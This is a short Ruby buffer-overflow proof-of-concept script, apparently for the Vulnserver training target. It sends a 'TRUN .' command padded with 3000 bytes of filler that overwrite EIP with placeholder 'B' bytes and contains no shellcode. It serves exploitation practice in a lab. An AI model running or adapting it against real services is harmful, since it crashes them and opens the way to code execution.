#!/usr/bin/env ruby

require 'net/http'

buffer = "\x41" * 2006
eip = "\x42" * 4
rest = "\x43" * ( 3000 - (buffer + eip).size)

exploit = buffer + eip + rest


host = ARGV[0]
port = ARGV[1]

s = TCPSocket.open(host, port)
s.recv(1024)
s.send("TRUN ." + exploit, 0)
s.close

#-> Exploit Info

puts "[+] " + "Buffer length: " + "#{exploit.size} bytes."
puts "[+] Done"